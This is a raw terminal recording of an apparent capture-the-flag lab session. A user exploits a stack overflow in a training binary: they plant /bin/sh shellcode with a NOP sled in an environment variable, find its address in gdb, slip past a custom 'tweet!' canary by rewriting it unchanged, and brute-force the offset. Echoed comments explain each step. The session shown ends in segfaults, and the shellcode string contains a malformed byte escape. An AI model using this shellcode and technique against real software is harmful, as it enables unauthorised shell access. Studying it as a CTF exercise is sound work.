+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mexport EGG=$(printf "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\xx6a\x3c\x58\x0f\x05")[A[C[C[C[C[Ccho "shit, I forgot the \$". [K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cnv[Kxport EGG=EGG[C[C[C[Cfor i in {0..200}; do EGG=$NOP$EGG; done[1@e[1@x[1@p[1@o[1@r[1@t[1@ 
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mfor i in {0..200}; do export EGG=$NOP$EGG; done[C[C[C[Cexport EGG=$(printf "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\xx6a\x3c\x58\x0f\x05")[A[C[C[C[C[Ccho "shit, I forgot the \$". [K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cnv[K
+XDG_SESSION_ID=611
+SHELL=/bin/bash
+TERM=xterm
+EGG=H1ÒH»ÿ/bin/shHΑλSH‰ηH1ΐPWH‰ζ°;j_j<X
+USER=ctf
+LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
+SUDO_USER=ubuntu
+SUDO_UID=1000
+USERNAME=root
+MAIL=/var/mail/ctf
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+PWD=/home/ctf/manifesto/OVERFLOW
+LANG=en_US.UTF-8
+SHLVL=3
+SUDO_COMMAND=/bin/su
+HOME=/home/ctf
+LOGNAME=ctf
+XDG_RUNTIME_DIR=/run/user/1000
+SUDO_GID=1000
+_=/usr/bin/env
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho prtgrv[K[K[K[K[Kerfect. now we need to find the address. 
+perfect. now we need to find the address.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mgs[Kdb [K[K[K[Kecho "typically, the environment variables are somewhere around 800 bytes after the a[Kbase pointer[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Khigher than the base pointer of the running binary."
+typically, the environment variables are somewhere around 800 bytes higher than the base pointer of the running binary.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mgdb overflow
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from overflow...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x400611
+(gdb) r
+Starting program: /home/ctf/manifesto/OVERFLOW/overflow 
+
+Breakpoint 1, 0x0000000000400611 in main ()
+(gdb) x/100s $rbpo[K+800
+0x7fffffffe820:	"/overflow"
+0x7fffffffe82a:	"XDG_SESSION_ID=611"
+0x7fffffffe83d:	"TERM=xterm"
+0x7fffffffe848:	"SHELL=/bin/bash"
+0x7fffffffe858:	"EGG=", '\220' <repeats 196 times>...
+0x7fffffffe920:	"\220\220\220\220\220H1\322H\273\377/bin/shH\301\353\bSH\211\347H1\300PWH\211\346\260;\017\005j\001_j<X\017\005"
+0x7fffffffe94f:	"USER=ctf"
+0x7fffffffe958:	"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
+0x7fffffffea20:	":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
+0x7fffffffeae8:	"eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
+0x7fffffffebb0:	":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
+0x7fffffffec78:	"v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...
+0x7fffffffed40:	":*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00"...
+0x7fffffffee08:	";36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
+0x7fffffffee79:	"SUDO_USER=ubuntu"
+0x7fffffffee8a:	"SUDO_UID=1000"
+0x7fffffffee98:	"USERNAME=root"
+0x7fffffffeea6:	"COLUMNS=170"
+0x7fffffffeeb2:	"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"
+0x7fffffffef10:	"MAIL=/var/mail/ctf"
+0x7fffffffef23:	"_=/usr/bin/gdb"
+0x7fffffffef32:	"PWD=/home/ctf/manifesto/OVERFLOW"
+0x7fffffffef53:	"LANG=en_US.UTF-8"
+0x7fffffffef64:	"LINES=48"
+0x7fffffffef6d:	"HOME=/home/ctf"
+0x7fffffffef7c:	"SUDO_COMMAND=/bin/su"
+0x7fffffffef91:	"SHLVL=3"
+0x7fffffffef99:	"LOGNAME=ctf"
+0x7fffffffefa5:	"SUDO_GID=1000"
+0x7fffffffefb3:	"XDG_RUNTIME_DIR=/run/user/1000"
+0x7fffffffefd2:	"/home/ctf/manifesto/OVERFLOW/overflow"
+0x7fffffffeff8:	""
+0x7fffffffeff9:	""
+0x7fffffffeffa:	""
+0x7fffffffeffb:	""
+0x7fffffffeffc:	""
+0x7fffffffeffd:	""
+0x7fffffffeffe:	""
+0x7fffffffefff:	""
+0x7ffffffff000:	<error: Cannot access memory at address 0x7ffffffff000>
+0x7ffffffff000:	<error: Cannot access memory at address 0x7ffffffff000>
+---Type <return> to continue, or q <return> to quit---q
+Quit
+(gdb) bingo. 
+Undefined command: "bingo".  Try "help".
+(gdb) e[Kquit
+A debugging session is active.
+
+	Inferior 1 [process 1505] will be killed.
+
+Quit anyway? (y or n) y
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho "I like to dive into the middle of my nop sled when i doo this [K[K[K[K[K[K[K this sort of thing"
+I like to dive into the middle of my nop sled when i do this sort of thing
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho "I'm going to aim for 0x7fffffffe920, minus 0x20. but I have to e[Ksave this address in binary format, and in little-endian f[K[K. watch."
+I'm going to aim for 0x7fffffffe920, minus 0x20. but I have to save this address in binary format, and in little-endian. watch.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [maddr=$(printf "\x00[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ke[Kecho "wait, I can't use an address ending in \x00, because that's the null byte, and will terminate the t[Kinput string. lets[K's go with 02"
+wait, I can't use an address ending in \x00, because that's the null byte, and will terminate the input string. let's go with 02
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [maddr =[K[K=$(printf "\x02\xx[Ke9\xff\xff\xff\x7f") #backwards because of the little-endian thing, but we read each pair of digits forwards.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho $d[Kaddr
+ιÿÿÿ
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m./[K[Kpadding=(arg: 1) padding=[C[C[C[C[C[C2[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@5[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@6[C[C[C[C[C[C[C[C[C[C[7P[00;32m=[01;32m=> [mpadding=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m./overflow $padding
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+DEAD CANARY!
+Segmentation fault (core dumped)
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [mecho "too big/[K."[K wee [K[K killed the canary. ket[K[K[Klet's be more careful. that was a 256 byte long padding. [K"
+too big. we killed the canary. let's be more careful. that was a 256 byte long padding.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mpadding=(arg: 1) padding=[C[C[C[C[C[C2[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@5[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1@5[C[C[C[C[C[C[C[C[C[C[7P[00;32m=[01;32m=> [mpadding=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m./overflow $ps[Kadding
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+The canary says: tweet!
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m./overflow $padding"tween[Kt!"
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!
+
+DEAD CANARY!
+Segmentation fault (core dumped)
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;31m=[01;31m=> [m./overflow $padding"tweet!"a"tweet!"
+==> tweet!
+
+The canary says: tweet!
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m./overflow $paddinga"tweet!""a"tweet!"[C[C"tweet!"
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!
+
+The canary says: tweet!
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho "there's the sweet spot. see what [KI[K I did there? I overwrote the "tweet!" (the "cna[K[K[K[Kcn[K[K[K[K[K[K[K\(the cnar[K[K[Kanary string\) with "tweet!"\"\"tweet!\"
+bash: !": event not found
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m./overflow $padding"a""tweet!"[2Pa"tweet!""a""tweet!"[C[C[C[C[Kecho "see what I did there? I v[Koverwrote the \[K'[Ktweet\1[K! with the same string, so that the trap wouldn't [K[K[K\'t spring. sort of like when Indiana Jones swi[Kaps the idol for a bag  of sand. excep thti[K[K[K[K[Kt this i[Kwill work"
+see what I did there? I overwrote the tweet\! with the same string, so that the trap wouldn\'t spring. sort of like when Indiana Jones swaps the idol for a bag of sand. except this will work
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho "see what I did there? I overwrote the tweet\! with the same string, so that the trap wouldn\'t spring. sort of like when Indiana Jones swaps the idol for a bag oof sand. except this will work"[A[C[C[C[C[K
+[K[A[C[C[C[Cecho "now, we're past the canary, and we just need to inject our [K[K[K[Kthe addres o[Ks[K[K[Ks of[K[K[Ks of the shellcode. we're in the home street[K[Ktch. [K"
+now, we're past the canary, and we just need to inject the address of the shellcode. we're in the home stretch.
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mecho "now, we're past the canary, and we just need to inject the address of the shellcode. we're in the home stretch."[C[C[C[C[C[C[C[C[C[Csee what I did there? I overwrote the tweet\! with the same string, so that the trap wouldn\'t spring. sort of like when Indiana Jones swaps the idol for a bag oof sand. except this will work"[A[C[C[C[C./overflow $padding"a""tweet!"[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C$addr
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!ιÿÿÿ
+
+The canary says: tweet!ιÿÿÿ
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m./overflow $padding"a""tweet!"$addrX$addrX$addrX$addr
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!XXXιÿÿÿ
+
+The canary says: tweet!XXXιÿÿÿ
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [m./overflow $padding"a""tweet!"XXX$addr[C[1P$addr[1P$addr[1P$addr[C[C[C[C[K"[Kecho why not fb[K[Kbut[K[K[Kru[K[Kbrute fore[Kce it?
+why not brute force it?
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mfor i in {0..20}; do [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[KX=X
+[01;32m-=oO( [00;32m0[01;32m )([00;32m ctf@cuboniks[01;32m OVERFLOW[01;32m )Oo=-[00;32m
+[00;32m=[01;32m=> [mfor in [K[K in {0..20}; do X=$x[KX"x"; ./overflow $pass[K[Kdding"a""tweet!"$X$addr;done
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxιÿÿÿ
+
+The canary says: tweet!Xxιÿÿÿ
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxιÿÿÿ
+
+The canary says: tweet!Xxxιÿÿÿ
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxιÿÿÿ
+
+The canary says: tweet!Xxxxιÿÿÿ
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxιÿÿÿ
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxιÿÿÿ
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxιÿÿÿ
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxιÿÿÿ
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxιÿÿÿ
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxιÿÿÿ
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxxιÿÿÿ
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxxxιÿÿÿ
+Segmentation fault (core dumped)
+==> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatweet!Xxxxxxxxxxxxxιÿÿÿ
+
+The canary says: tweet!Xxxxxxxxxxxxxιÿÿÿ
+Segmentation fault (core dumped)
